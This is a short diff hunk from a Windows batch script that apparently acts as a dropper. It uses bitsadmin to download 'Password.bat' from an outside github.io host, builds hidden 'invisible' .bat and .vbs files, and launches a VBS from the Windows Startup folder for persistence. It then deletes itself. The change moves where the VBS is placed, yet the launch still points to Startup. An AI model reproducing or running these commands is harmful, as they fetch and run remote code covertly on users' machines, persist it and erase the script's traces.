@@ -40,7 +40,7 @@ bitsadmin.exe /transfer "10" https://athdot.github.io/dwnld/Password.bat %USERPR
 @echo )>> invisible.bat
 @echo goto :check>> invisible.bat
 move %USERPROFILE%\Desktop\invisible.bat %USERPROFILE%\Documents\MASTERFOLDER\invisible.bat
-move %USERPROFILE%\Desktop\invisible.vbs C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\invisible.vbs
+move %USERPROFILE%\Desktop\invisible.vbs %USERPROFILE%\Documents\MASTERFOLDER\invisible.vbs
 
 start C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\invisible.vbs
 (goto) 2>nul & del "%~f0"
